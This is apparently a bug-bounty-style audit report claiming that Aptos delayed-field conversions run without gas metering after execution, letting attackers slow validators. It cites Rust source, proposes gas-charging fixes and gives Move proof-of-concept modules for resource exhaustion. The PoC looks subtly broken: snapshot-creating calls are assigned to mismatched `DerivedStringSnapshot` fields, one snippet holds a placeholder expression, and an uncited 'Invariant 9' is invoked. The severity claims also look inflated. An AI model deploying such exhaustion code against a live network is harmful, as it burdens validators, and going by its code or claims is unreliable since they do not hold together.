# Audit Report

## Title
Unmetered Computational Cost in DelayedFieldValue Conversions Enables Validator Resource Exhaustion

## Summary
Conversions between Move values and `DelayedFieldValue` are not properly gas-metered for computational cost. These conversions occur during post-execution materialization, outside the gas-metered transaction execution context, allowing attackers to force validators to perform expensive computation without paying for it.

## Finding Description

The Aptos blockchain uses delayed fields (aggregators v2) to defer certain value computations. During transaction execution, delayed field values are stored as lightweight `DelayedFieldID` identifiers. After execution completes, these identifiers must be converted back to actual values for storage commitment.

**The Critical Flaw**: This conversion happens in the post-execution materialization phase, completely outside the gas-metered execution context. [1](#0-0) 

The code explicitly acknowledges this issue with a TODO comment stating "Temporarily limit the number of delayed fields per resource, until proper charges are implemented." Currently, only a hardcoded limit of 10 delayed fields per resource exists, with no gas charges for the conversion computation itself.

**Attack Vector**:

1. During transaction execution, an attacker creates multiple resources containing delayed field values, particularly `Derived` types with large byte arrays (up to 1024 bytes maximum). [2](#0-1) 

2. These values are stored as `DelayedFieldID` during execution while gas is being metered.

3. After execution completes, the system calls materialization functions: [3](#0-2) 

4. These functions trigger conversions via `try_into_move_value`: [4](#0-3) 

5. For `Derived` types, the conversion performs expensive operations: [5](#0-4) 

This calls `bytes_and_width_to_derived_string_struct` which:
- Allocates new vectors
- Performs BCS size calculations
- Creates padding vectors
- Packs struct values [6](#0-5) 

**Why This Breaks Security Invariants**:

The conversion operations happen in `replace_identifiers_with_values`: [7](#0-6) 

This function performs deserialization-serialization round trips WITHOUT any gas metering. An attacker can create a transaction that:
- Uses most/all of its gas budget during normal execution
- Creates N resources with up to 10 `Derived` delayed fields each (1024 bytes each)
- Forces validators to perform `10 × N` expensive conversions post-execution
- Each conversion involves ~1KB of vector allocations + BCS calculations + struct packing

This violates **Invariant 9**: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This is a **Medium severity** vulnerability under the Aptos bug bounty program, potentially crossing into **High severity** territory:

- **High Severity criteria met**: "Validator node slowdowns" - Attackers can force validators to perform significant unmetered computation during block execution, causing slowdowns.

- **Medium Severity criteria met**: "State inconsistencies requiring intervention" - If validators become overloaded, they may fall behind in processing, creating temporary state inconsistencies across the network.

The impact is limited by:
- Maximum of 10 delayed fields per resource
- Maximum of 1024 bytes per derived string
- Storage fees still apply to the final serialized size

However, an attacker can amplify the attack by:
- Modifying many resources in a single transaction (limited by transaction write op limits)
- Submitting many such transactions
- Each conversion involves non-trivial computation (vector allocations, BCS calculations, struct operations)

## Likelihood Explanation

**High likelihood** - This vulnerability is easily exploitable:

1. **No special privileges required**: Any user can submit transactions with delayed field values
2. **Direct API access**: Native functions like `create_snapshot` and `derive_string_concat` are publicly accessible
3. **Predictable behavior**: The conversion always happens post-execution for any transaction using delayed fields
4. **Low cost to attacker**: Only pays for transaction gas and storage, not conversion computation
5. **Acknowledged issue**: The TODO comment confirms this is a known limitation awaiting proper implementation

An attacker can trivially exploit this by:
```move
// Create multiple resources with max delayed fields
module attacker::exploit {
    use aptos_framework::aggregator_v2;
    
    struct Resource has key {
        field1: DerivedStringSnapshot,
        field2: DerivedStringSnapshot,
        // ... up to 10 fields
    }
    
    public entry fun exploit(account: &signer) {
        // Create large derived strings (1024 bytes each)
        let large_string = /* 1024 byte string */;
        
        // Create multiple resources
        move_to(account, Resource { 
            field1: aggregator_v2::create_snapshot(large_string),
            // ... repeat for all fields
        });
    }
}
```

## Recommendation

Implement proper gas charging for delayed field conversions. The fix requires:

1. **Immediate mitigation**: Reduce `MAX_DELAYED_FIELDS_PER_RESOURCE` and `DERIVED_STRING_INPUT_MAX_LENGTH` to limit exploitation surface.

2. **Proper fix**: Add gas charges for conversion operations:

```rust
// In value_serde.rs or a new delayed field gas module
pub struct DelayedFieldConversionGasParameters {
    pub per_field_conversion_base: InternalGas,
    pub per_byte_conversion: InternalGasPerByte,
}

// In the conversion path, charge gas:
impl DelayedFieldValue {
    pub fn try_into_move_value(
        self,
        layout: &MoveTypeLayout,
        width: u32,
        gas_meter: &mut impl GasMeter,  // Add gas meter parameter
    ) -> Result<Value, PartialVMError> {
        // Charge base conversion cost
        gas_meter.charge_delayed_field_conversion_base()?;
        
        match self {
            Derived(bytes) => {
                // Charge per-byte cost for derived conversions
                gas_meter.charge_delayed_field_conversion_per_byte(
                    NumBytes::new(bytes.len() as u64)
                )?;
                // ... existing conversion logic
            }
            // ... rest of implementation
        }
    }
}
```

3. **Propagate gas meter**: Modify the materialization pipeline to accept and use a gas meter for post-execution operations, or pre-charge an estimated cost during execution.

4. **Alternative approach**: Perform conversions during execution (within gas-metered context) rather than post-execution.

## Proof of Concept

```move
module attacker::resource_exhaustion {
    use aptos_framework::aggregator_v2;
    use std::string::{Self, String};
    use std::vector;
    
    // Resource with maximum allowed delayed fields
    struct ExploitResource has key {
        f1: aggregator_v2::DerivedStringSnapshot,
        f2: aggregator_v2::DerivedStringSnapshot,
        f3: aggregator_v2::DerivedStringSnapshot,
        f4: aggregator_v2::DerivedStringSnapshot,
        f5: aggregator_v2::DerivedStringSnapshot,
        f6: aggregator_v2::DerivedStringSnapshot,
        f7: aggregator_v2::DerivedStringSnapshot,
        f8: aggregator_v2::DerivedStringSnapshot,
        f9: aggregator_v2::DerivedStringSnapshot,
        f10: aggregator_v2::DerivedStringSnapshot,
    }
    
    // Create a large string (approaching 1024 byte limit)
    fun create_large_string(): String {
        let bytes = vector::empty<u8>();
        let i = 0;
        // Create ~1000 byte string
        while (i < 1000) {
            vector::push_back(&mut bytes, 65); // 'A'
            i = i + 1;
        };
        string::utf8(bytes)
    }
    
    public entry fun exploit(account: &signer) {
        let large_str = create_large_string();
        
        // Create 10 derived snapshots (max per resource)
        // Each will require expensive conversion post-execution
        move_to(account, ExploitResource {
            f1: aggregator_v2::create_snapshot(large_str),
            f2: aggregator_v2::create_snapshot(large_str),
            f3: aggregator_v2::create_snapshot(large_str),
            f4: aggregator_v2::create_snapshot(large_str),
            f5: aggregator_v2::create_snapshot(large_str),
            f6: aggregator_v2::create_snapshot(large_str),
            f7: aggregator_v2::create_snapshot(large_str),
            f8: aggregator_v2::create_snapshot(large_str),
            f9: aggregator_v2::create_snapshot(large_str),
            f10: aggregator_v2::create_snapshot(large_str),
        });
        
        // Attacker can create multiple such resources to amplify effect
        // Each resource forces 10 expensive conversions post-execution
        // Total unmetered computation: ~10KB of vector operations per resource
    }
}
```

**Execution**: Deploy this module and call `exploit()`. The transaction will complete successfully within its gas budget, but validators will perform ~10KB of unmetered vector allocations and struct packing operations during post-execution materialization.

**Notes**
This vulnerability exploits the gap between gas-metered execution and post-execution materialization. While storage fees cover the final serialized size, the computational cost of the conversion operations is completely unaccounted for, violating the fundamental principle that all validator computation should be paid for by the transaction submitter.

### Citations

**File:** third_party/move/move-vm/types/src/value_serde.rs (L50-54)
```rust
    // Temporarily limit the number of delayed fields per resource, until proper charges are
    // implemented.
    // TODO[agg_v2](clean):
    //   Propagate up, so this value is controlled by the gas schedule version.
    const MAX_DELAYED_FIELDS_PER_RESOURCE: usize = 10;
```

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator_v2.rs (L52-54)
```rust
/// The maximum length of the input string for derived string snapshot.
/// If we want to increase this, we need to modify BITS_FOR_SIZE in types/src/delayed_fields.rs.
pub const DERIVED_STRING_INPUT_MAX_LENGTH: usize = 1024;
```

**File:** aptos-move/block-executor/src/executor.rs (L1209-1213)
```rust
        let materialized_resource_write_set =
            map_id_to_values_in_write_set(resource_writes_to_materialize, &latest_view)?;

        let events = last_input_output.events(txn_idx);
        let materialized_events = map_id_to_values_events(events, &latest_view)?;
```

**File:** aptos-move/block-executor/src/value_exchange.rs (L86-107)
```rust
    fn identifier_to_value(
        &self,
        layout: &MoveTypeLayout,
        identifier: DelayedFieldID,
    ) -> PartialVMResult<Value> {
        self.delayed_field_ids.borrow_mut().insert(identifier);
        let delayed_field = match &self.latest_view.latest_view {
            ViewState::Sync(state) => state
                .versioned_map
                .delayed_fields()
                .read_latest_predicted_value(
                    &identifier,
                    self.txn_idx,
                    ReadPosition::AfterCurrentTxn,
                )
                .expect("Committed value for ID must always exist"),
            ViewState::Unsync(state) => state
                .read_delayed_field(identifier)
                .expect("Delayed field value for ID must always exist in sequential execution"),
        };
        delayed_field.try_into_move_value(layout, identifier.extract_width())
    }
```

**File:** aptos-move/aptos-aggregator/src/types.rs (L161-163)
```rust
            (Derived(bytes), layout) if is_derived_string_struct_layout(layout) => {
                bytes_and_width_to_derived_string_struct(bytes, width as usize)?
            },
```

**File:** third_party/move/move-vm/types/src/delayed_values/derived_string_snapshot.rs (L72-100)
```rust
pub fn bytes_and_width_to_derived_string_struct(
    bytes: Vec<u8>,
    width: usize,
) -> PartialVMResult<Value> {
    // We need to create DerivedStringSnapshot struct that serializes to exactly match given `width`.

    let value_width = bcs_size_of_byte_array(bytes.len());
    // padding field takes at list 1 byte (empty vector)
    if value_width + 1 > width {
        return Err(code_invariant_error(format!(
            "DerivedStringSnapshot size issue: no space left for padding: value_width: {value_width}, width: {width}"
        )));
    }

    // We assume/assert that padding never exceeds length that requires more than 1 byte for size:
    // (otherwise it complicates the logic to fill until the exact width, as padding can never be serialized into 129 bytes
    // (vec[0; 127] serializes into 128 bytes, and vec[0; 128] serializes into 130 bytes))
    let padding_len = width - value_width - 1;
    if size_u32_as_uleb128(padding_len) > 1 {
        return Err(code_invariant_error(format!(
            "DerivedStringSnapshot size issue: padding expected to be too large: value_width: {value_width}, width: {width}, padding_len: {padding_len}"
        )));
    }

    Ok(Value::struct_(Struct::pack(vec![
        bytes_to_string(bytes),
        Value::vector_u8(vec![0; padding_len]),
    ])))
}
```

**File:** aptos-move/block-executor/src/view.rs (L1269-1334)
```rust
    pub(crate) fn replace_identifiers_with_values(
        &self,
        bytes: &Bytes,
        layout: &MoveTypeLayout,
    ) -> anyhow::Result<(Bytes, HashSet<DelayedFieldID>)> {
        // Cfg due to deserialize_to_delayed_field_id use.
        #[cfg(test)]
        fail_point!("delayed_field_test", |_| {
            assert_eq!(
                layout,
                &mock_layout(),
                "Layout does not match expected mock layout"
            );

            // Replicate the logic of identifier_to_value.
            let (delayed_field_id, txn_idx) = deserialize_to_delayed_field_id(bytes)
                .expect("Mock deserialization failed in delayed field test.");
            let delayed_field = match &self.latest_view {
                ViewState::Sync(state) => state
                    .versioned_map
                    .delayed_fields()
                    .read_latest_predicted_value(
                        &delayed_field_id,
                        self.txn_idx,
                        ReadPosition::AfterCurrentTxn,
                    )
                    .expect("Committed value for ID must always exist"),
                ViewState::Unsync(state) => state
                    .read_delayed_field(delayed_field_id)
                    .expect("Delayed field value for ID must always exist in sequential execution"),
            };

            // Note: Test correctness relies on the fact that current proptests use the
            // same layout for all values ever stored at any key, given that some value
            // at the key contains a delayed field.
            Ok((
                serialize_from_delayed_field_u128(
                    delayed_field.into_aggregator_value().unwrap(),
                    txn_idx,
                ),
                HashSet::from([delayed_field_id]),
            ))
        });

        // This call will replace all occurrences of aggregator / snapshot
        // identifiers with values with the same type layout.
        let function_value_extension = self.as_function_value_extension();
        let value = ValueSerDeContext::new(function_value_extension.max_value_nest_depth())
            .with_func_args_deserialization(&function_value_extension)
            .with_delayed_fields_serde()
            .deserialize(bytes, layout)
            .ok_or_else(|| {
                anyhow::anyhow!(
                    "Failed to deserialize resource during id replacement: {:?}",
                    bytes
                )
            })?;

        let mapping = TemporaryValueToIdentifierMapping::new(self, self.txn_idx);
        let patched_bytes = ValueSerDeContext::new(function_value_extension.max_value_nest_depth())
            .with_delayed_fields_replacement(&mapping)
            .with_func_args_deserialization(&function_value_extension)
            .serialize(&value, layout)?
            .ok_or_else(|| anyhow::anyhow!("Failed to serialize resource during id replacement"))?
            .into();
        Ok((patched_bytes, mapping.into_inner()))
```
